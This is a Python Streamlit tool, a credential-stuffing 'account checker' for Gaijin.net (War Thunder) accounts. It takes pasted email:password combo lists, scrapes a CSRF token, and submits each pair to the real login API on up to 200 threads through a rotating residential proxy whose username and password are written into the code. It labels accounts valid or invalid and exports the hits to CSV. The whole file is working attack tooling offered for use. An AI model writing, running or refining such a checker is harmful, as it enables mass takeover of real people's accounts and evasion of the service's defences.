import streamlit as st
import requests
import re
import json
import concurrent.futures
import pandas as pd
from threading import Lock

# ===== YOUR ROTATING PROXY (ROTATES ON EVERY REQUEST) =====
PROXY = {
    "http": "http://r612u8062522872tmnotsumc-country-US:vsnfskj978y64mym@proxy.nightfallen.quest:8080",
    "https": "http://r612u8062522872tmnotsumc-country-US:vsnfskj978y64mym@proxy.nightfallen.quest:8080"
}

BASE_URL = "https://login.gaijin.net"
LOGIN_PAGE_URL = f"{BASE_URL}/en/login"
LOGIN_API_URL = f"{BASE_URL}/api/login"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

API_HEADERS = {
    "User-Agent": HEADERS["User-Agent"],
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "Origin": BASE_URL,
    "Referer": LOGIN_PAGE_URL
}

lock = Lock()
results_list = []

def get_csrf_token(session):
    try:
        resp = session.get(LOGIN_PAGE_URL, headers=HEADERS, proxies=PROXY, timeout=15)
        resp.raise_for_status()
        match = re.search(r'<meta name="_csrf" content="([^"]+)"', resp.text)
        if match:
            return match.group(1)
        match = re.search(r'window\._csrf\s*=\s*"([^"]+)"', resp.text)
        if match:
            return match.group(1)
        return None
    except:
        return None

def check_account(session_factory, email, password, progress_bar, total_combos, counter):
    session = session_factory()
    csrf = get_csrf_token(session)
    if not csrf:
        status = "ERROR"
        full_response = "Failed to extract CSRF token"
    else:
        payload = {"login": email, "password": password, "remember": False, "_csrf": csrf}
        try:
            resp = session.post(LOGIN_API_URL, json=payload, headers=API_HEADERS, proxies=PROXY, timeout=15)
            resp_json = resp.json()
            if resp_json.get("ok"):
                status = "VALID"
            else:
                status = "INVALID"
            full_response = json.dumps(resp_json, indent=2, ensure_ascii=False)
        except Exception as e:
            status = "ERROR"
            full_response = f"Request error: {str(e)}"

    with lock:
        results_list.append({
            "Email": email,
            "Password": password,
            "Status": status,
            "Full Capture": full_response
        })
        counter[0] += 1
        progress_bar.progress(counter[0] / total_combos)

def main():
    st.set_page_config(page_title="War Thunder Checker", layout="wide")
    st.title("War Thunder Gaijin.net Account Checker")
    st.caption("Proxy locked. Full capture. No bullshit syntax errors.")

    combo_text = st.text_area(
        "Paste combos (email:password), one per line",
        height=200,
        placeholder="acepilot@shit.com:thunder123"
    )

    col1, col2 = st.columns(2)
    with col1:
        threads = st.slider("Threads (1-200)", 1, 200, 20)
    with col2:
        start_btn = st.button("Start Checking", type="primary")

    if 'checked' not in st.session_state:
        st.session_state.checked = False
        st.session_state.df = pd.DataFrame()

    if start_btn and combo_text.strip():
        combos = [line.strip() for line in combo_text.splitlines() if line.strip()]
        if not combos:
            st.warning("Paste some fucking combos first.")
            return

        parsed = []
        for line in combos:
            if ':' in line:
                email, pwd = line.split(':', 1)
                parsed.append((email, pwd))
            else:
                parsed.append((line, ""))

        results_list.clear()
        progress_bar = st.progress(0.0)
        counter = [0]

        def session_factory():
            sess = requests.Session()
            sess.proxies = PROXY
            return sess

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for email, pwd in parsed:
                futures.append(executor.submit(check_account, session_factory, email, pwd, progress_bar, len(parsed), counter))
            concurrent.futures.wait(futures)

        if results_list:
            df = pd.DataFrame(results_list)
            st.session_state.df = df
            st.session_state.checked = True
            progress_bar.empty()
            st.success(f"Done. {len(results_list)} combos checked.")
        else:
            st.error("No results. Proxy might be dead or combos are garbage.")

    if st.session_state.checked and not st.session_state.df.empty:
        df = st.session_state.df
        valid = len(df[df['Status'] == 'VALID'])
        invalid = len(df[df['Status'] == 'INVALID'])
        err = len(df[df['Status'] == 'ERROR'])
        c1, c2, c3 = st.columns(3)
        c1.metric("Valid", valid)
        c2.metric("Invalid", invalid)
        c3.metric("Errors", err)

        st.subheader("Full Capture Logs")
        for _, row in df.iterrows():
            with st.expander(f"{row['Email']} | {row['Status']}"):
                st.text(row['Full Capture'])

        csv = df.to_csv(index=False).encode('utf-8')
        st.download_button("Download CSV", csv, "war_thunder_checked.csv", "text/csv")

if __name__ == "__main__":
    main()
